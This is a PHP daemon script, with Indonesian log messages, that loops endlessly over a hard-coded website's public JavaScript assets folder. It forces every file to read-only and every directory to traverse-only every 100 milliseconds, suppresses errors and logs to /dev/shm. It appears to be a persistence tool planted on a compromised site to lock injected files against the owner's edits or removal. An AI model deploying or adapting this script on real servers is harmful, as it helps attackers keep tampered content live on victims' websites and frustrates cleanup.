<?php
set_time_limit(0);
error_reporting(E_ALL);
ini_set('display_errors', 0);
$target = '/home/drivedig/whatsyfly.com/public/build/assets/js';
$logFile = '/dev/shm/shm.log';
$Microsec = 100000;

function writeLog($msg) {
    global $logFile;
    $time = date('Y-m-d H:i:s');
    $line = "[$time] $msg\n";
    $fp = @fopen($logFile, 'a');
    if ($fp) {
        @flock($fp, LOCK_EX);
        @fwrite($fp, $line);
        @flock($fp, LOCK_UN);
        @fclose($fp);
    }
}

function currentProcessUid() {
    if (function_exists('posix_geteuid')) {
        return posix_geteuid();
    }
    return null;
}

function octalPerms($permsInt) {
    return sprintf('%04o', $permsInt & 0777);
}

function processTree($root) {
    if (!is_dir($root)) {
        writeLog("Target bukan directory: $root");
        return;
    }

    if (!is_readable($root)) {
        writeLog("Tidak bisa membaca root directory (permission): $root");
        return;
    }

    $dirs = [];
    try {
        $flags = FilesystemIterator::SKIP_DOTS | FilesystemIterator::CURRENT_AS_FILEINFO;
        $rdi = new RecursiveDirectoryIterator($root, $flags);
        $rii = new RecursiveIteratorIterator($rdi, RecursiveIteratorIterator::SELF_FIRST);
    } catch (Throwable $e) {
        writeLog("Exception saat membuka dir: " . $e->getMessage());
        return;
    }

    $procUid = currentProcessUid();

    foreach ($rii as $info) {
        $path = $info->getPathname();
        if ($info->isDir()) {
            $dirs[] = $path;
            continue;
        }

        $perms = @fileperms($path);
        if ($perms === false) {
            writeLog("Tidak bisa baca perms file: $path");
            continue;
        }
        $perms = $perms & 0777;

        $ownerUid = @fileowner($path);
        if ($procUid !== null && $ownerUid !== false && $procUid !== $ownerUid) {
            writeLog("Skip chmod file (owner mismatch): $path owner=" . ($ownerUid) . " proc=" . $procUid);
            continue;
        }

        if ($perms !== 0444) {
            $ok = @chmod($path, 0444);
            if ($ok) {
                writeLog("Sukses chmod file 0444: $path (sebelum " . octalPerms($perms) . ")");
            } else {
                writeLog("Gagal chmod file: $path (sebelum " . octalPerms($perms) . ")");
            }
        }
    }

    usort($dirs, function($a, $b) {
        return substr_count($b, DIRECTORY_SEPARATOR) - substr_count($a, DIRECTORY_SEPARATOR);
    });

    foreach ($dirs as $d) {
        if (!is_dir($d)) continue;

        $perms = @fileperms($d);
        if ($perms === false) {
            writeLog("Tidak bisa baca perms dir: $d");
            continue;
        }
        $perms = $perms & 0777;

        $ownerUid = @fileowner($d);
        if ($procUid !== null && $ownerUid !== false && $procUid !== $ownerUid) {
            writeLog("Skip chmod dir (owner mismatch): $d owner=" . ($ownerUid) . " proc=" . $procUid);
            continue;
        }

        if ($perms !== 0111) {
            $ok = @chmod($d, 0111);
            if ($ok) {
                writeLog("Sukses chmod dir 0111: $d (sebelum " . octalPerms($perms) . ")");
            } else {
                writeLog("Gagal chmod dir: $d (sebelum " . octalPerms($perms) . ")");
            }
        }
    }

    $rootPerms = @fileperms($root);
    if ($rootPerms !== false) {
        $rootPerms = $rootPerms & 0777;
        $ownerUid = @fileowner($root);
        if (!($procUid !== null && $ownerUid !== false && $procUid !== $ownerUid)) {
            if ($rootPerms !== 0111) {
                $ok = @chmod($root, 0111);
                if ($ok) {
                    writeLog("Sukses chmod root 0111: $root (sebelum " . octalPerms($rootPerms) . ")");
                } else {
                    writeLog("Gagal chmod root: $root (sebelum " . octalPerms($rootPerms) . ")");
                }
            }
        } else {
            writeLog("Skip chmod root (owner mismatch): $root owner=" . ($ownerUid) . " proc=" . $procUid);
        }
    }
}

writeLog("===== START daemon (target: $target) =====");
while (true) {
    processTree($target);
    usleep($Microsec);
}
